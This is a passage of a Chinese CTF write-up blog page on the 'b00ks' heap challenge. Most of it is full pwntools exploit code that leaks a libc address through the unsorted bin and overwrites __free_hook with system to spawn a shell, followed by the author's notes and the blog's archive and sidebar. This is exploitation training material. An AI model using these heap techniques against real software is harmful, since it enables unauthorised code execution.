class="string">&#x27;/bin/sh&#x27;</span>).<span class="title function_">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="title function_">edit</span>(<span class="number">1</span>, <span class="title function_">p64</span>(binsh) + <span class="title function_">p64</span>(free_hook))</span><br><span class="line"><span class="title function_">edit</span>(<span class="number">2</span>, <span class="title function_">p64</span>(system_addr))</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"><span class="title function_">free</span>(<span class="number">2</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">sh.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+<p>最后将book2给free了即可 因为我们是写到book2上的 不过这个exp对环境要求比较高 远程没通</p>
+<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><p>原理其实很简单 当一个比较大(自己调试)的chunk被free之后 他会进入unsorted bin中 而这个unsorted bin中的的fd或者bk指针与libc的基址差值也是个固定值</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = <span class="title function_">process</span>(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">#sh = <span class="title function_">remote</span>(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27783</span>)</span><br><span class="line">libc = <span class="title function_">ELF</span>(<span class="string">&#x27;/home/apple/Desktop/buulibc/libc-2.23.buu.so&#x27;</span>)</span><br><span class="line">elf = <span class="title function_">ELF</span>(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">#libc1 = elf.<span class="property">libc</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">create</span>(name_size, name, desc_size, desc):</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(name_size))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book name (Max 32 chars)&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(name)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(desc_size))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(desc)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">change</span>():</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span>():</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">free</span>(id):</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter the book id you want to delete:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(id))</span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span>(id,payload):</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter the book id you want to edit:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(id))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter new book description:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(payload)</span><br><span class="line"></span><br><span class="line">gdb.<span class="title function_">attach</span>(sh)</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">sh.<span class="title function_">sendline</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="title function_">create</span>(<span class="number">0x80</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>, <span class="number">0x80</span>, <span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="title function_">show</span>()</span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">book1_addr = <span class="title function_">u64</span>(sh.<span class="title function_">recv</span>(<span class="number">6</span>).<span class="title function_">ljust</span>(<span class="number">8</span>,<span class="string">&#x27;\\0&#x27;</span>))</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;book1_addr = &#x27;</span>, <span class="title function_">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="title function_">create</span>(<span class="number">0x80</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x80</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="title function_">create</span>(<span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\\x00&#x27;</span>, <span class="number">0x20</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">unsorted_bin_addr = book1_addr + <span class="number">0x30</span></span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="title function_">p64</span>(<span class="number">1</span>) + <span class="title function_">p64</span>(unsorted_bin_addr + <span class="number">0x8</span>) + <span class="title function_">p64</span>(book1_addr + <span class="number">0x1d0</span> + <span class="number">0x20</span>) + <span class="title function_">p64</span>(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">edit</span>(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="title function_">change</span>()</span><br><span class="line"></span><br><span class="line"><span class="title function_">free</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="title function_">show</span>()</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">libc_base = <span class="title function_">u64</span>(sh.<span class="title function_">recv</span>(<span class="number">6</span>).<span class="title function_">ljust</span>(<span class="number">8</span>,<span class="string">&#x27;\\0&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;libc_base = &#x27;</span>, <span class="title function_">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.<span class="property">sym</span>[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.<span class="property">sym</span>[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">print (<span class="string">&#x27;system_addr = &#x27;</span>, <span class="title function_">hex</span>(system_addr))</span><br><span class="line">#binsh_addr = libc_base + libc.<span class="title function_">search</span>(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="title function_">next</span>()</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">#payload = <span class="title function_">p64</span>(binsh_addr) + <span class="title function_">p64</span>(free_hook)</span><br><span class="line"></span><br><span class="line"><span class="title function_">edit</span>(<span class="number">1</span>, <span class="title function_">p64</span>(free_hook) + <span class="title function_">p64</span>(<span class="number">0x10</span>))</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"><span class="title function_">edit</span>(<span class="number">3</span>, <span class="title function_">p64</span>(system_addr))</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"><span class="title function_">sleep</span>(<span class="number">15</span>)</span><br><span class="line"><span class="title function_">free</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+<p>所以大体还是那样 只不过有两个比较玄学的问题 第一是关于binsh字段的 之前修改时payload是binsh + free_hook 可是这样的payload在这个exp中打不通 这样子的free_hook写不进system 于是转变了一下思路 在一开始就在name字段写进binsh 然后就是那个sleep 不sleep(15)的话没办法free</p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://dawoxiansigema.github.io">Eureka</a>
+            <p>Link：<a href="https://dawoxiansigema.github.io/2023/11/01/b00ks/">https://dawoxiansigema.github.io/2023/11/01/b00ks/</a>
+            <p>Publish date：<a href="https://dawoxiansigema.github.io/2023/11/01/b00ks/">November 1st 2023, 11:00:55 am</a>
+            <p>Update date：<a href="https://dawoxiansigema.github.io/2023/11/01/b00ks/">November 1st 2023, 11:10:31 am</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2023/11/01/2015-hacklu-bookstore/" title="(堆拓展)2015_hacklu_bookstore">
+                    <div class="nextTitle">(堆拓展)2015_hacklu_bookstore</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/11/01/bjdctf-2020-babyrop2/" title="(canary)bjdctf_2020_babyrop2">
+                    <div class="prevTitle">(canary)bjdctf_2020_babyrop2</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2071970042@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/dawoxiansigema" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E4%BC%AA%E9%80%A0-b00ks"><span class="toc-number">1.</span> <span class="toc-text">[溢出伪造]b00ks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.</span> <span class="toc-text">泄漏地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0HEAP"><span class="toc-number">1.3.</span> <span class="toc-text">伪造HEAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FREE-HOOK"><span class="toc-number">1.4.</span> <span class="toc-text">FREE_HOOK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsorted-bin"><span class="toc-number">1.5.</span> <span class="toc-text">Unsorted bin</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 30
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/2015-hacklu-bookstore/">(堆拓展)2015_hacklu_bookstore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/ACTF-2019-message/">(Tcache)ACTF_2019_message</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/Mac%E4%B8%8BHexo%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/">Mac下Hexo踩坑记录</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/b00ks/">(溢出伪造)b00ks</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/metasequoia-2020-samsara/">(Fastbin)metasequoia_2020_samsara</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/npuctf-2020-easy-heap/">(堆重叠)npuctf_2020_easy_heap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/">(栈转移)Black_Watch_入群题_PWN</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/CISCN-2019-es-2/">(栈转移)CISCN_2019_es_2</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/CISCN-2019-s-3/">(Srop&Ret2csu)CISCN_2019_s_3</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/bjdctf-2020-babyrop2/">(canary)bjdctf_2020_babyrop2</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/jarvisoj-fm/">(栈对齐)jarvisoj_fm</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span>
+            <a class="archive-post-title" href="/2023/11/01/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9B-PWN5/">第五空间2019决赛_PWN5</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/CISCN-2019-c-1/">(Libc泄露)CISCN_2019_c_1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/GET-STARTED-3DSCTF-2016/">(Bss提权)GET_STARTED_3DSCTF_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/HarekazeCTF2019-baby-rop2/">(Libc泄露)HarekazeCTF2019_baby_rop2</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/OGeek2019-babyrop/">(Libc泄露)OGeek2019_babyrop</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/ez-pz-hackover-2016/">(ret2syscall)ez_pz_hackover_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/pwnable-orw/">(Shellcode)pwnable_orw</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/CTFwiki%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/">CTFwiki基本栈溢出</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/CTFwiki%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/">CTFwiki基础栈溢出</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/CTFwiki%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA/">CTFwiki高级栈溢出</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2023/10/31/Fomatstring/">Fomatstring</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2021/10/31/21%E9%95%BF%E5%AE%89%E6%9D%AF/">21长安杯</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span>
+            <a class="archive-post-title" href="/2021/10/18/0928%E5%B9%BF%E4%B8%9C%E7%9C%81%E6%AF%94%E6%AD%A6/">0928广东省比武</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span>
+            <a class="archive-post-title" href="/2021/10/06/19%E8%83%BD%E5%8A%9B/">cnas2019</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span>
+            <a class="archive-post-title" href="/2021/09/26/frida/">Frida</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span>
+            <a class="archive-post-title" href="/2021/09/25/cnas2021/">cnas2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span>
+            <a class="archive-post-title" href="/2021/08/06/FIC2021/">FIC2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span>
+            <a class="archive-post-title" href="/2021/07/17/%E4%B8%AD%E7%A7%91%E7%AC%AC%E4%B8%80%E5%B1%8A/">第一届中科实数杯</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span>
+            <a class="archive-post-title" href="/2021/03/07/20%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF/">20年美亚杯</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Forensic">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Forensic
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Heap">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Heap
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Stack/Medium">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Stack/Medium
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Stack/Basic">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Stack/Basic
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Stack/Advanced">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Stack/Advanced
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Fomatstring">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Fomatstring
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Fix">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Fix
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://dawoxiansigema.github.io",
+        root: siteMetaRoot,
+        author: "Eureka"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
